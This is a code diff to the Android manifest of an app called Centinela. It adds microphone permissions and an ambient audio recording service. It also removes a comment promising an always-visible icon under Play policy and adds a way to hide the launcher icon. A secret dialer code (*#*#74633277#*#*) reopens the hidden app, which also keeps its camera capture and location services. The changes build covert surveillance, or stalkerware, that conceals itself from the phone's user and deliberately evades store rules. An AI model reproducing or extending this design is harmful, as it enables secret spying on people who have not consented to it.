@@ -13,6 +13,8 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
     <uses-permission android:name="android.permission.INTERNET" />
@@ -30,15 +32,33 @@
         android:label="@string/app_name"
         android:theme="@style/Theme.Centinela">
 
-        <!-- Ícono SIEMPRE visible en el launcher: no hay modo oculto (política Play). -->
+        <!-- Actividad principal (se abre por el ícono, por el código secreto o desde el portal). -->
         <activity
             android:name=".ui.MainActivity"
-            android:exported="true">
+            android:exported="true" />
+
+        <!-- Alias del ícono en el menú: se puede ocultar/mostrar sin frenar la app.
+             Al desactivar este alias desaparece el ícono, pero MainActivity sigue disponible. -->
+        <activity-alias
+            android:name=".LauncherIcon"
+            android:targetActivity=".ui.MainActivity"
+            android:exported="true"
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <!-- Código secreto para reabrir la app con el ícono oculto: *#*#74633277#*#* -->
+        <receiver
+            android:name=".admin.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="74633277" />
+            </intent-filter>
+        </receiver>
 
         <activity android:name=".ui.OnboardingActivity" android:exported="false" />
 
@@ -109,6 +129,12 @@
         <service
             android:name=".commands.CaptureService"
             android:foregroundServiceType="camera"
+            android:exported="false" />
+
+        <!-- Grabación de audio de ambiente (FGS tipo micrófono) -->
+        <service
+            android:name=".commands.AudioCaptureService"
+            android:foregroundServiceType="microphone"
             android:exported="false" />
 
         <!-- (Legado) Servicio de rastreo anterior, ya no se usa. -->
